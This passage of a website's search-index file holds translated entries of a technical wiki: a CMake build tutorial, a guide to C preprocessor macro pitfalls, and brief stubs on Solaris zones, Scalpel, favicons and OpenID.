                content: "Introduction linkCMake is a cross-platform build system. It is comparable to Make in that the software build process is entirely controlled by configuration files, called CMakeLists.txt in the case of CMake. But CMake doesn’t directly produce the final software; it handles the generation of standard build files: makefiles on Unix, and Visual Studio project files on Windows. This allows developers to use their preferred development environment as usual. This use of common development tools is what distinguishes CMake from other build systems like SCons or Autotools.\nThe name “CMake” is an abbreviation for “cross platform make”. Despite the use of “make” in its name, CMake is a separate and higher-level application than the make tool.\nPreamble linkAs a summary of the previous article, I propose to build a small base project that will serve as a support for the rest of the article. I’m using CMake version 2.4 here.\nLet’s consider an ultra-classic and not at all original project that we will call Hello. Wait! That sounds like “Hello World”! I could have done a “Goodbye Everybody!”, but I was afraid you might leave before the end ;-). Let’s get serious: all the files for this project will be stored in the hello directory. This directory contains the files AUTHORS, COPYING, INSTALL, README, ChangeLog, and the src subdirectory, which contains the source files.\n~ $ ls -R hello hello: AUTHORS CMakeLists.txt src ChangeLog README COPYING INSTALL hello/src: CMakeLists.txt main.cpp We start with a very simple code that serves only as a support:\n// main.cpp #include #include using namespace std; int main (void) { cout \u003c\u003c \"Hello World !\" \u003c\u003c endl; exit (EXIT_SUCCESS); } The integration of CMake is done by adding 2 CMakeLists.txt files: one in the main directory and one in the src directory.\nThe hello/CMakeLists.txt file is the first to be read by CMake during execution. It is in this file that we do the tests necessary to ensure the availability of the project dependencies. We will also place the code reading and using the compilation options and generating a package for our project.\n# top-level CMakeLists.txt cmake_minimum_required (VERSION 2.4.0 FATAL_ERROR) project (Hello) include (CheckIncludeFileCXX) set (Hello_RQ_HEADERS iostream cstdlib) foreach (RQ_HDR ${Hello_RQ_HEADERS}) check_include_file_cxx (${RQ_HDR} RQ_HDR_RET) if (NOT RQ_HDR_RET) message (FATAL_ERROR \"missing ${RQ_HDR} !\") endif (NOT RQ_HDR_RET) endforeach (RQ_HDR ${Hello_RQ_HEADERS}) add_subdirectory (src) For now, we just have a loop that tests for the presence of header files essential for compiling the project on the system. If they are not present, we interrupt the process. Then, we call the CMakeLists.txt file from the src subdirectory.\nThe hello/src/CMakeLists.txt file contains the definition of the project’s compilation targets and their configuration.\n# src CMakeLists.txt include_directories (${Hello_SOURCE_DIR}/src) add_executable (hello main.cpp) install (TARGETS hello DESTINATION bin) Let’s create a build directory for our project and a directory for its installation (this will allow us to check the installed files):\nmkdir hello_build mkdir hello_install Let’s build and install our project:\ncd hello_build cmake -DCMAKE_INSTALL_PREFIX=../hello_install ../hello make make install ls -R ../hello_install ../hello_install: bin ../hello_install/bin: hello Hello World ! The project is compiled and installed in the desired directory, the necessary directory structure is created. You can execute it.\nThroughout the article, we will amend the various files of the project and add others. The line numbers specified in the code snippets below indicate where to insert the new code in the file concerned. You will find the Hello-0.0.0.tar.bz2 package containing the entirety of this example in its final state on the site https://www.arvernux.fr in the Downloads section.\nManaging a configuration file linkTo manage the project configuration, for example to add optional capabilities, we will use a config.h header file generated by CMake from an input file config.h.cmake. So we need to include it in the project sources:\n// main.cpp #include \"config.h\" ... And add the location of config.h to the compilation directives. This file will be saved in the project’s build directory.\nsrc CMakeLists.txt include_directories (${Hello_SOURCE_DIR}/src ${Hello_BINARY_DIR}/src) add_executable (hello main.cpp) install (TARGETS hello DESTINATION bin) This technique can be used to handle two types of options: enable/disable type options and with_stuff=foo type options. We will see the first kind in the section on internationalization. Here, we focus on the second kind… We will use it to repeat the message that is displayed.\n// main.cpp ... const int hcount = HELLO_COUNT; int main (void) { for (int i=hcount; i\u003e0; i--) cout \u003c\u003c \"Hello World !\" \u003c\u003c endl; ... The value of the HELLO_COUNT definition will be imported from config.h. Let’s create the template file for config.h, that is, the config.h.cmake file in the src subdirectory.\n// config.h.cmake #ifndef _CONFIG_H #define _CONFIG_H #define HELLO_COUNT @WITH_HELLO_COUNT@ #endif /* _CONFIG_H */ When generating the config.h, CMake will replace the string @WITH_HELLO_COUNT@ with its value, which is configured by the CMakeLists.txt file in the root folder of the project:\n# top-level CMakeLists.txt if (NOT WITH_HELLO_COUNT) set (WITH_HELLO_COUNT 1 CACHE STRING \"Repeating count\") endif (NOT WITH_HELLO_COUNT) ... configure_file (${Hello_SOURCE_DIR}/src/config.h.cmake ${Hello_BINARY_DIR}/src/config.h) ... The test in lines 7 to 9 serves to ensure an initial value if the user does not define it. Additionally, we use this definition in line 8 to provide a description of the option to the user. The options can be viewed as follows:\n$ cmake -LH ../hello ... // Repeating count WITH_HELLO_COUNT:STRING=1 ... Let’s go back to the parameters of the variable definition in line 8. First, the name of the variable, then its value (the one we want it to have by default). The CACHE parameter is mandatory, otherwise the option doesn’t appear. STRING corresponds to the option type, which is used to choose the right “widget” for editing in ccmake (the ncurses and interactive version of CMake). Finally, the documentation string.\nAnd how can the user define it? By adding this option -DWITH_HELLO_COUNT=2 to the CMake call (or by using ccmake).\ncmake -DCMAKE_INSTALL_PREFIX=../hello_install -DWITH_HELLO_COUNT=2 ../hello make make install ../hello_install/bin/hello Hello World ! Hello World ! Centralized management of a version number linkWe can very well use the previous technique to manage a version number in a centralized way. Let’s create a version.cmake file in the hello directory with the following content:\n# Hello version number set (Hello_MAJOR 0) set (Hello_MINOR 0) set (Hello_PATCH 0) set (Hello_VERSION ${Hello_MAJOR}.${Hello_MINOR}.${Hello_PATCH}) # Hello release date set (Hello_RELEASE \"2008-12-03\") There! So we will only modify the version number in this file, and we will use CMake to distribute this number wherever we want it; example:\ntop-level CmakeLists.txt ... include (version.cmake) message (STATUS \"*** Building Hello ${Hello_VERSION} ***\") That’s for the cosmetics… Yes, it’s needed! But we can also use it in the program itself:\n// config.h.cmake ... #define HELLO_MAJOR @Hello_MAJOR@ #define HELLO_MINOR @Hello_MINOR@ #define HELLO_PATCH @Hello_PATCH@ #define HELLO_RELEASE @Hello_RELEASE@ ... Thus, after configuration, we will have the version numbers defined in our config.h file and we will be able to use them in the source code.\nThis version number management will also be used later in the packages section, and we can also use it in documentation generation.\nInternationalization linkYou want to internationalize your code. Prepare your main.cpp file:\n//main.cpp ... #ifdef HELLO_NLS_ENABLED #include #include #define _(String) dgettext (HELLO_NLS_PACKAGE, String) #else /* HELLO_NLS_ENABLED */ #define _(String) String #endif /* HELLO_NLS_ENABLED */ ... { #ifdef HELLO_NLS_ENABLED locale::global (locale (\"\")); bindtextdomain (HELLO_NLS_PACKAGE, HELLO_NLS_LOCALEDIR); #endif /* HELLO_NLS_ENABLED */ ... cout \u003c\u003c _(\"Hello World !\") \u003c\u003c endl; ... The definitions HELLO_NLS_ENABLED, HELLO_NLS_LOCALEDIR, and HELLO_NLS_PACKAGE depend on the content of the config.h file, and their values will be configured by CMake. Don’t forget to mark the string to translate in line 17.\nAdapt your config.h.cmake by adding the following lines:\n... #cmakedefine HELLO_NLS_ENABLED #cmakedefine HELLO_NLS_PACKAGE \"@HELLO_NLS_PACKAGE@\" #cmakedefine HELLO_NLS_LOCALEDIR \"@HELLO_NLS_LOCALEDIR@\" ... With the implementation ready in your program, you need to generate the po/hello.pot file using xgettext.\nmkdir po xgettext -k_ -o po/hello.pot -D src --package-name=hello main.cpp I refer you to the manual pages and various how-tos for implementing internationalization and using the tools that realize it: this is not the subject of our study.\nWe create the translation for French (for example): po/fr.po.\nHow to configure CMake to compile the MO files and install them?\nIn the hello/CMakeLists.txt file, we start by making the activation optional:\n... option (ENABLE_NLS \"Native Language Support\" ON) ... The option is enabled by default, but the user can disable it by passing -DENABLE_NLS=OFF to CMake when calling it. The string that describes the option will be displayed if the user runs CMake with the -LH options:\ncmake -LH ../hello ... // Native Language Support ENABLE_NLS:BOOL=ON ... Then, first, we perform detection of the necessary files and utilities:\n... if (ENABLE_NLS) set (HELLO_NLS_ENABLED TRUE) set (Hello_I18N_HEADERS locale.h libintl.h) foreach (HDR ${Hello_I18N_HEADERS}) check_include_file_cxx (${HDR} HDR_RET) if (NOT HDR_RET) message (STATUS \"missing ${HDR} ! Internationalization aborted.\") set (HELLO_NLS_ENABLED FALSE) endif (NOT HDR_RET) endforeach (HDR ${Hello_I18N_HEADERS}) if (HELLO_NLS_ENABLED) find_program (MSGFMT_EXECUTABLE msgfmt) if (NOT MSGFMT_EXECUTABLE) message (STATUS \"msgfmt not found! Internationalization aborted.\") set (HELLO_NLS_ENABLED FALSE) endif (NOT MSGFMT_EXECUTABLE) endif (HELLO_NLS_ENABLED) else (ENABLE_NLS) set (HELLO_NLS_ENABLED FALSE) endif (ENABLE_NLS) If the option is enabled, we verify that the locale.h and libintl.h headers are present on the system. If they are not there, we display a warning message and disable internationalization support. Here, I made the choice to build the project anyway… If you think it is necessary to stop the build and require the headers, simply change the STATUS directive on line 33 to FATAL_ERROR. The next section looks for the msgfmt utility that is used to compile PO files into MO. I make the same remark as before concerning the possibility of stopping the process rather than disabling the option in case this utility is absent.\nNote: In CMake version 2.5, a break command will appear allowing you to exit a foreach loop. This will greatly simplify the implementation of the previous loop.\nIn a second step, we configure the necessary variables:\nif (HELLO_NLS_ENABLED) set (HELLO_NLS_PACKAGE hello) set (HELLO_NLS_LOCALEDIR ${CMAKE_INSTALL_PREFIX}/share/locale) add_subdirectory (po) message (STATUS \"Native language support enabled.\") else (HELLO_NLS_ENABLED) message (STATUS \"Native language support disabled.\") endif (HELLO_NLS_ENABLED) ... In line 51, we include the CMakeLists.txt file from the po subdirectory. It is in this file that we will add the target allowing the compilation of translated messages:\n# po CmakeLists.txt add_custom_target (i18n ALL COMMENT \"Building i18n messages.\") file (GLOB Hello_PO_FILES ${Hello_SOURCE_DIR}/po/*.po) foreach (Hello_PO_INPUT ${Hello_PO_FILES}) get_filename_component (Hello_PO_INPUT_BASE ${Hello_PO_INPUT} NAME_WE) set (Hello_MO_OUTPUT ${Hello_BINARY_DIR}/po/${Hello_PO_INPUT_BASE}.mo) add_custom_command (TARGET i18n COMMAND ${MSGFMT_EXECUTABLE} -o ${Hello_MO_OUTPUT} ${Hello_PO_INPUT}) install (FILES ${Hello_MO_OUTPUT} DESTINATION share/locale/${Hello_PO_INPUT_BASE}/LC_MESSAGES RENAME ${HELLO_NLS_PACKAGE}.mo) endforeach (Hello_PO_INPUT ${Hello_PO_FILES}) Let’s detail the code a bit:\nFirst, we create a new target i18n linked to the all target. Then, we get the list of all .po files to compile in the Hello_PO_FILES variable. This is followed by a loop that is repeated for each of these files (Hello_PO_INPUT). In this loop, we start by extracting the filename without the extension (Hello_PO_INPUT_BASE), i.e., the language for which the file provides the translation. Then, we generate the name and complete path of the .mo file where the translation will be compiled (Hello_MO_OUTPUT). Next, we add to the i18n target the command allowing this compilation (call to msgfmt). Finally, we add the command that will install the obtained file in the right directory structure and with the right name during make install.\nLet’s see if we’ve done a good job:\ncmake -DCMAKE_INSTALL_PREFIX=../hello_install ../hello ... -- Native language support enabled. ... make ... make install ... -- Installing /home/patrice/hello_install/share/locale/LC_MESSAGES/fr/hello.mo ... ../hello_install/bin/hello Hello World! “Oh! It works!”\nGenerating packages linkYour project is beautiful! Very beautiful! You’d like to distribute it. So you need to generate packages… No problem! CPack, the “package management” component of CMake, is here to help us.\nLet’s generate a package containing the binaries and a package containing the sources of our project. To do this, simply place the following code at the end of the CMakeLists.txt file in the root directory of our project.\n... set (CPACK_GENERATOR \"TGZ\") set (CPACK_PACKAGE_VERSION_MAJOR ${Hello_MAJOR}) set (CPACK_PACKAGE_VERSION_MINOR ${Hello_MINOR}) set (CPACK_PACKAGE_VERSION_PATCH ${Hello_MAJOR}) set (CPACK_SOURCE_GENERATOR \"TBZ2\") set (CPACK_SOURCE_PACKAGE_FILE_NAME Hello-${Hello_VERSION}) set (CPACK_SOURCE_IGNORE_FILES \"~$\" \".bz2$\" \".gz$\") include (CPack) The CPACK_GENERATOR and CPACK_SOURCE_GENERATOR variables define the formats of the generated packages. Here, the binary package will be a tar archive compressed by gzip and the source package will be a tar archive compressed by bzip2. The version number definitions are used to configure the package name. Regarding the source package, the CPACK_SOURCE_IGNORE_FILES variable allows specifying files and directories that should not be part of the package. This variable accepts regular expressions. Thus, in “~$”, the $ sign indicates the end of the filename. All files ending with ~ will be ignored.\nLet’s generate the packages:\ncmake -DCMAKE_INSTALL_PREFIX=../hello_install ../hello ... make package ... make package_source ... ls *.tar* Hello-0.0.0-Linux.tar.gz Hello-0.0.0.tar.bz2 Note:\nCPack, when generating the binary package, only takes into account files installed by an install command under one condition: the destination must be a path relative to the content of the CMAKE_INSTALL_PREFIX variable. Files whose installation path is absolute will be ignored. This is a current limitation of CPack, perhaps it will disappear?\nSo, we’ve reached the end of this article. We’ve covered some methods to get from CMake what we used to do with autotools (and even a bit more). However, we still need to look at some particular techniques regarding library distribution. That’s an opportunity for us to meet again next time.\nResources linkhttp://www.unixgarden.com/index.php/programmation/quelques-exemples-d%E2%80%99utilisation-de-cmake\nCMake: the next generation in project construction\n"
            }
        );
    index.add(
            {
                id:  477 ,
                href: "\/Mieux_conna%C3%AEtre_et_utiliser_le_pr%C3%A9processeur_du_langage_C\/",
                title: "Better Understanding and Using the C Language Preprocessor",
                description: "A comprehensive guide to C language preprocessing, including common pitfalls and best practices for using preprocessor directives, macros, and conditional compilation.",
                content: "Introduction linkIn the C language, preprocessing is the preliminary stage before compilation. It’s a powerful mechanism that allows conditional compilation, file inclusion, and macro definition. Although these features appear simple at first glance, they must be used carefully to avoid compilation errors or, worse, program malfunctions. Additionally, the GCC preprocessor has additional features that can be very useful.\nA Little-Known Compiler Failure linkThanks to the C macro processor, it’s possible to define and use constants as follows:\n#include #define CONSTANTE_1 (0x3d+20) #define CONSTANTE_2 (0x3e+20) #define CONSTANTE_3 (0x3f+20) int main(int ac, char *av[]) { printf(\"%u\\n\", CONSTANTE_1); printf(\"%u\\n\", CONSTANTE_2); printf(\"%u\\n\", CONSTANTE_3); } If we compile this program, we get an unexpected error:\n\u003e gcc main.c main.c:10:18: error: invalid suffix \"+20\" for integer constant The compiler detects an error at line 10, column 18, which is at the CONSTANTE_2 macro. This is a compiler failure that occurs because it thinks it’s dealing with an integer constant denoted by “0x3” with a positive exponent denoted by “e+20”: 0x3 raised to the power of 20. This is not legal notation in C, as exponents are only allowed for floating types. To work around this trap, we need to rewrite CONSTANTE_2 by separating “e” and “+” with a space character:\n#define CONSTANTE_2 (0x3e + 20) This way, compilation and execution can proceed:\n\u003e gcc main.c \u003e ./a.out 81 82 83 Interestingly, this problem exists in the Linux kernel source for PowerPC version. Just look at the file “…/linux-source-2.6.22/include/asm-powerpc/irq.h” to see the following definition that doesn’t compile when used:\n#define SIU_INT_PC1 ((uint)0x3e+CPM_IRQ_OFFSET) It is therefore advised to systematically put a space on both sides of the “+” and “-” operators when defining a macro with the hexadecimal digit “e”.\nMacro Termination linkIt is not recommended to end a macro with a “;” as in the following example:\n#define ADD(a, b) a + b; int main(int ac, char *av[]) { int r = ac; if (r) r = ADD(4, 5); else r = ADD(5, 6); return 0; } This leads to a compilation error:\n\u003e gcc main.c main.c: In function \"main\": main.c:9: error: expected expression before \"else\" Line 9 contains two instructions due to the addition of “;” after the ADD() call. The result of the preprocessor shows this clearly:\n\u003e gcc -E main.c [...] if (r) r = 4 + 5;; else r = 5 + 6;; The else instruction is orphaned because the if to which it’s supposed to relate contains more than one instruction that are not grouped by braces: “r = 4 + 5;” and “;”.\nGrouping Instructions linkWhen a macro contains multiple instructions such as:\n#define ADD(a, b, c) \\ printf(\"%d + %d \", a, b); \\ c = a + b; \\ printf(\"= %d\\n\", c); You may encounter the compilation error mentioned in section 2 if it is used in an if statement, because the user of the macro might not put braces around the call. Or maybe the macro originally contained only one instruction and was logically used in if statements without being surrounded by braces, but software evolution made it necessary to add additional instructions to it. In the latter case, you risk introducing subtle software malfunctions if, for example, the macro is used in a while instruction without braces:\n#include #define ADD(a, b, c) \\ printf(\"%d + %d \", a, b); \\ c = a + b; \\ printf(\"= %d\\n\", c); int main(int ac, char *av[]) { int i = 0; int r = 0; while (av[i++]) ADD(r, 1, r); return 0; } We expect all instructions grouped in ADD() to be executed at each iteration of the loop. Unfortunately, the preprocessor will generate a sequence of instructions without braces, so at each iteration, only the first instruction “printf(\"%d + %d “, a, b)” will be executed. To avoid such errors, it is advisable to group the instructions in a “do-while” not followed by “;” (rule from section 2), in order to make the multi-instruction macro appear as a single instruction:\n#define ADD(a, b, c) do { \\ printf(\"%d + %d \", a, b); \\ c = a + b; \\ printf(\"= %d\\n\", c); \\ } while(0) The compiler will not generate a loop since the iteration condition is always false: while(0). You should not simply use braces, as this would cause the problem from section 2 if the macro was used in an “if-else” due to the “;” that might follow the call in the if body. With the loop not followed by “;”, the user is forced to put a semicolon after the macro call or face a compilation error, but they will have only one instruction: the “do-while” loop.\nParenthesizing Parameters linkConsider the following small program that defines and uses a macro performing integer division:\n#include #define DIV(a, b, c) do { \\ printf(\"%d / %d \", a, b); \\ c = a / b; \\ printf(\"= %d\\n\", c); \\ } while(0) int main(int ac, char *av[]) { int r = 5; int v1 = 12; int v2 = 6; DIV(v1, v2, r); DIV(v1 + 6, v2, r); return 0; } When executing, we expect the result 2 for the first division (12 / 6) and the result 3 for the second division ((12 + 6) / 6). But we get the following incorrect result:\n\u003e ./a.out 12 / 6 = 2 18 / 6 = 13 As usual, when in doubt with macros, we need to visualize the preprocessor output:\nint main(int ac, char *av[]) { int r = 5; int v1 = 12; int v2 = 6; do { printf(\"%d / %d \", v1, v2); r = v1 / v2; printf(\"= %d\\n\", r); } while(0); do { printf(\"%d / %d \", v1 + 6, v2); r = v1 + 6 / v2; printf(\"= %d\\n\", r); } while(0); return 0; } We find that we are faced with an operator priority problem in the second call to DIV(). Indeed, in the expression “r = v1 + 6 / v2”, the “/” operator takes precedence over the “+” operator. The compiler therefore generates the equivalent of the mathematical operation “r = v1 + (6 / v2)”. Hence the result 13 when v1 and v2 are 12 and 6 respectively. The solution is to systematically “parenthesize” all occurrences of parameters in a macro:\n#define DIV(a, b, c) do { \\ printf(\"%d / %d \", (a), (b)); \\ (c) = (a) / (b); \\ printf(\"= %d\\n\", (c)); \\ } while(0) The second call to DIV() in the previous program now gives the correct result in the preprocessor output:\ndo { printf(\"%d / %d \", (v1 + 6), (v2)); (r) = (v1 + 6) / (v2); printf(\"= %d\\n\", (r)); } while(0); Parenthesizing Expressions linkConsider the constant defined as the CONSTANTE macro and used as follows:\n#include #define BASE 2000 #define CONSTANTE BASE + 2 int main(int ac, char *av[]) { printf(\"%d\\n\", CONSTANTE / 2); return 0; } The expected display is the result of the operation “2002 / 2”, which is 1001. And yet, we get 2001. The preprocessor output shows that the program generates an operator priority problem as seen in section 4:\nprintf(\"%d\\n\", 2000 + 2 / 2); Generally speaking, if a macro consists of an expression (constant, test, ternary operator…), it is prudent to parenthesize it. Hence the correction of the example:\n#define BASE (2000) #define CONSTANTE (BASE + 2) Avoiding Expressions as Parameters linkWe often tend to use a macro as if it were a function, or code evolution may lead to a function becoming a macro for readability or optimization reasons. Here’s an example of a program that defines and uses the IS_BLANK(c) macro that returns true if the parameter is a whitespace character (space or tab):\n#include #define IS_BLANK(c) ((c) == '\\t' || (c) == ' ') int main(int ac, char *av[]) { char *p = av[0]; while(*p) { if (IS_BLANK(*(p++))) { printf(\"Blank at index %d\\n\", (p - 1) - av[0]); } } return 0; } This program is supposed to display the indices of whitespace characters in its name. However, the displayed index is incorrect or some blanks are not detected:\n\u003e gcc main.c -o \"name with spaces\" \u003e ./name\\ with\\ spaces Blank at index 5 The only detected blank is indicated at index 5, whereas in the string “./name with spaces”, there are blanks at indices 5 and 10. This is because the parameter c is evaluated twice in the IS_BLANK() macro: the first time to be compared to ‘\\t’ and the second to be compared to ’ ‘. However, the program passes *(p++) to the macro. This gives in the preprocessor output:\nif (((*(p++)) == '\\t' || (*(p++)) == ' ')) In other words, the first comparison is with the character pointed to by p, p being then incremented (post-increment), and the second comparison is with the following character. When returning from the macro, p is incremented again. The proper way to write the program is therefore to avoid passing an expression as a parameter to the macro:\n#include #define IS_BLANK(c) ((c) == '\\t' || (c) == ' ') int main(int ac, char *av[]) { char *p = av[0]; while(*p) { if (IS_BLANK(*p)) { printf(\"Blank at index %d\\n\", p - av[0]); } p ++; } return 0; } It is not always easy to follow this rule, especially if IS_BLANK() was a function and after code evolution, the function became a macro. Indeed, such a modification implies that a complete code review must be done. This is not easy, or even impossible, if the macro is defined in a header file that is already used in many programs around the world.\nA GCC-specific extension, not necessarily conforming to ANSI C, offers the opportunity to transform instruction blocks (instructions enclosed by braces) into an expression (cf. [1]). Since it is also possible to declare variables local to a block, the IS_BLANK() macro can be rewritten as follows:\n#include #define IS_BLANK(c) ({char _c = c; ((_c) == '\\t' || (_c) == ' ');}) int main(int ac, char *av[]) { char *p = av[0]; while(*p) { if (IS_BLANK(*(p++))) { printf(\"Blank at index %d\\n\", (p - 1) - av[0]); } } return 0; } The local variable _c was defined inside the macro’s block to store the value of the parameter. Thus, the latter is evaluated only once: at the time of assignment of the local variable.\nVariable Number of Arguments linkThe ISO C99 standard allows defining macros with a variable number of arguments. There are two notations:\n#include #define DEBUG(fmt, ...) \\ fprintf(stderr, fmt „\\n\", __LINE__, __VA_ARGS__) #define DEBUG2(fmt, args...) \\ fprintf(stderr, fmt „\\n\", __LINE__, args) int main(int ac, char *av[]) { DEBUG(\"Program name = %s\", av[0]); DEBUG(\"Message without arguments\"); DEBUG2(\"Program name = %s\", av[0]); DEBUG2(\"Message without arguments\"); return 0; } DEBUG() and DEBUG2() are overloads of the fprintf() function to display a formatted error message. The fmt parameter concatenated with character strings is the format passed as the first argument to the display function. The notations VA_ARGS or “args” represent all arguments in variable number with the commas that separate them. The second notation is often preferred to the first one because it allows naming the arguments (for example here with args) instead of using the generic identifier VA_ARGS. The second notation was specific to GCC before macros with variable number of arguments were standardized. On older versions of GCC, it is therefore the only supported notation.\nAlthough very practical, these notations have a major drawback: they do not allow calls without arguments. Here’s the result of compilation followed by the preprocessor output for the previous program:\n\u003e gcc main.c main.c: In function \"main\": main.c:12: error: expected expression before \")\" token main.c:15: error: expected expression before \")\" token \u003e gcc -E main.c [...] int main(int ac, char *av[]) { fprintf(stderr, „Program name = %s\" „\\n\", 11, av[0]); fprintf(stderr, \"Message without arguments\" \"\\n\", 12, ); fprintf(stderr, \"Program name = %s\" \"\\n\", 14, av[0]); fprintf(stderr, \"Message without arguments\" \"\\n\", 15, ); return 0; } The compilation errors come from the comma that precedes the empty list of variable arguments in the second and fourth calls to fprintf(). GCC proposes a very useful extension through the “##” notation to eliminate the comma when the list of arguments that follows it is empty. Hence the following rewrite of the macros:\n#define DEBUG(fmt, ...) \\ fprintf(stderr, fmt \"\\n\", __LINE__, ## __VA_ARGS__) #define DEBUG2(fmt, args...) \\ fprintf(stderr, fmt „\\n\", __LINE__, ## args) Special Macros linkThere are many macros and notations with a special role for the preprocessor. In this section, only the most useful or at least the most used are mentioned.\nGNUC linkThe GNUC macro is always defined when using the GCC compilation chain. It is therefore recommended for conditional compilation when a program uses GCC-specific extensions, but might be compiled by other compilation chains (see section 9 for an example of use).\nLINE, FILE and FUNCTION linkThe LINE, FILE and FUNCTION macros are respectively replaced by the line number, file name and function name in which they appear. These facilities are generally used for trace and error generation to aid in debugging. To illustrate, here’s a small program that displays its arguments using the DEBUG() macro, whose added value is to print the file name, function name, and line number from which it is called:\n#include #define DEBUG(fmt, args...) \\ fprintf(stderr, „%s(%s)#%d : „ fmt , \\ __FILE__, __FUNCTION__, __LINE__, ## args) int main(int ac, char *av[]) { int i; for (i = 0; i \u003c ac; i++) { DEBUG(\"Param %d is : %s\\n\", i, av[i]); } return 0; } [...] \u003e gcc debug.c \u003e ./a.out param1 param2 debug.c(main)#14 : Param 0 is : ./a.out debug.c(main)#14 : Param 1 is : param1 debug.c(main)#14 : Param 2 is : param2 Note that FUNCTION is specific to GCC. The C standard came after with the definition func. Although giving an identical result, these two notations had a major difference: the first expands to a constant character string while the other behaved as if, at the beginning of each function, a local array named “func” was defined and initialized with the constant character string containing the function name. So, on one hand, we had a constant that could be concatenated at compile time to other character strings, and on the other hand, we had a variable. But since version 3.4 of the GCC compiler, these two notations are identical and both behave like variables.\nThe “#” Operator linkThe “#” notation allows converting a macro parameter to a character string. For example, here is a function that displays a Linux signal number using the CASE_SIG() macro:\n#include #include #include #define CASE_SIG(s) case (s) : printf(\"%s\\n\", \"SIGNAL_\" #s); break void signum(int sig) { switch(sig) { CASE_SIG(SIGINT); CASE_SIG(SIGTERM); CASE_SIG(SIGKILL); CASE_SIG(SIGTRAP); CASE_SIG(SIGSEGV); CASE_SIG(SIGCHLD); [...] default : printf(\"???\\n\"); } } int main(int ac, char *av[]) { if (ac \u003e 1) { signum(atoi(av[1])); } } [...] \u003e gcc signal.c \u003e ./a.out 5 SIGNAL_SIGTRAP The “##” Operator linkWe’ve already seen one form of using “##” in section 7. But there is another form of use where this directive concatenates the lexical elements surrounding it to form a new lexical unit. In the following example, the words CONSTA and NTE are concatenated to form the name CONSTANTE which happens to be a macro defining the constant 233:\n#include #define CONSTANTE 233 #define CONCAT(a, b) a##b int main(int ac, char *av[]) { printf(\"%d\\n\", CONCAT(CONSTA, NTE)); } [...] \u003e gcc concat.c \u003e ./a.out 233 How to Eliminate GCC Attributes linkAttributes are GCC-specific extensions to increase checks and contribute to the optimization of generated code. Consider the following example which describes the “format” attribute (for more information on GCC attributes, see [4]). funct() calls two functions that perform formatted display in the manner of printf(): the first parameter contains a description of the format of a character string and the variable list of parameters that follow is used to construct the string to display. When calling these display functions, there is a classic programming error: the format requires the address of a character string and a signed integer, but the list of arguments only contains one signed integer.\nextern void my_printf1 (const char *fmt, ...); extern void my_printf2 (const char *fmt, ...) __attribute__ ((format (printf, 1, 2))); void funct(void) { my_printf1(\"Display of %s followed by %d\\n\", 46); my_printf2(\"Display of %s followed by %d\\n\", 46); } Compiling this program with the -Wall option will report the programming error (in the form of a “warning”) for line 11, but not for line 9. Indeed, on line 11, we use the my_printf2() function which is defined with the format attribute to indicate that it’s a “printf-like” function that uses a format in argument 1 and that the variable list of arguments starts at the second parameter:\n\u003e gcc -c -Wall attribute.c attribute.c: In function \"funct\": attribute.c:11: warning: format \"%s\" expects type \"char *\", but argument 2 has type \"int\" attribute.c:11: warning: too few arguments for format While the concept of attributes is practical and powerful, it can cause problems when the compiler used is not GCC. Since the attribute directive is defined with a single parameter (hence the double parenthesis when passing it multiple parameters so that they appear as a single one), it is possible to use conditional compilation to redefine attribute to nothing when the compiler used is not GCC:\n#ifndef __GNUC__ #define __attribute__(p) // Nothing #endif // __GNUC__ In this example, the compilation condition uses the GNUC flag which is defined by default only when GCC is used (see section 9.1).\nConditional Inclusions linkA header file is included in a source file using the “#include” directive. These files most often contain external declarations of variables or functions, type definitions, and macros. A header file can itself include other header files, because a basic rule in C programming is to make a header file independent. In other words, if a header file uses a type, macro, function, or variable, it is recommended that the header file where the corresponding definition is located be included in that file. In the example in figure 1, the main.c file includes the header files str.h and fct.h which respectively define the str_t type and the fonc() function. These last two include the entier.h file for the definition of the ENTIER type.\nCompiling main.c gives the following errors:\n\u003e gcc -c main.c In file included from fct.h:1, from main.c:2: entier.h:1: error: redefinition of typedef \"ENTIER\" entier.h:1: error: previous declaration of \"ENTIER\" was here The compiler reports that the ENTIER type is defined twice. The first definition comes from the str.h file and the second from the fct.h file, both of which include the entier.h file. This results in the main.c file including the entier.h file twice. To solve this problem, we can use conditional compilation to include a header file only if a definition specific to it is not already defined. This definition is generally made from the name of the file. To illustrate the point, here’s how the entier.h file is modified to be included only on the condition that ENTIER_H is not already defined:\n#ifndef ENTIER_H #define ENTIER_H typedef int ENTIER; #endif // ENTIER_H This allows compiling main.c, because ENTIER_H is defined by the inclusion of entier.h in str.h and this will therefore prevent the second inclusion of entier.h via fct.h. Generally speaking, it is advisable to apply the principle of conditional inclusion to any header file.\nConclusion linkThis article has presented numerous rules and tips to make the best use of C preprocessor facilities to help make programs robust, portable, and easy to debug. These are just a subset of the possibilities available. The reader can consult the links and references in this article to go further.\nResources linkhttp://www.unixgarden.com/index.php/programmation/mieux-connaitre-et-utiliser-le-preprocesseur-du-langage-c\n"
            }
        );
    index.add(
            {
                id:  478 ,
                href: "\/Installation_de_Zones_HA_avec_ZFS_et_Solaris_Cluster\/",
                title: "Installing HA Zones with ZFS and Solaris Cluster",
                description: "Documentation resources for installing high availability containers with ZFS using Solaris Cluster",
                content: "Here is excellent and quick-to-implement documentation:\nInstalling HA Containers With ZFS Using the Solaris 10 OS and Solaris Cluster 3.2 Software\nZone Cluster - How to Deploy virtual Clusters and why\n"
            }
        );
    index.add(
            {
                id:  479 ,
                href: "\/Scalpel_:_r%C3%A9cup%C3%A9rer_des_donn%C3%A9es_supprim%C3%A9es\/",
                title: "Scalpel: Recovering Deleted Data",
                description: "How to use Scalpel tool to recover deleted files and folders from your hard drive.",
                content: "Introduction linkScalpel is a tool that allows you to recover files and folders that have been deleted from your hard drive.\nResources linkRecover Deleted Files With Scalpel\n"
            }
        );
    index.add(
            {
                id:  480 ,
                href: "\/Cr%C3%A9er_une_favicon_pour_un_site_web\/",
                title: "Creating a Favicon for a Website",
                description: "How to create and convert images into favicons for websites",
                content: "Introduction linkA favicon is the small icon you see at the top of your browser, next to the URL. If you have a 16x16 size image, you can use the following method to convert it to the right format.\nConverting an Image link convert -colors 256 -resize 16x16 face.jpg face.ppm \u0026\u0026 ppmtowinicon -output favicon.ico face.ppm "
            }
        );
    index.add(
            {
                id:  481 ,
                href: "\/OpenID_:_Centralisation_d\u0027authentification\/",
                title: "OpenID: Authentication Centralization",
                description: "Learn how to centralize authentication with OpenID, a decentralized single sign-on solution that allows users to access multiple websites with a single identity.",
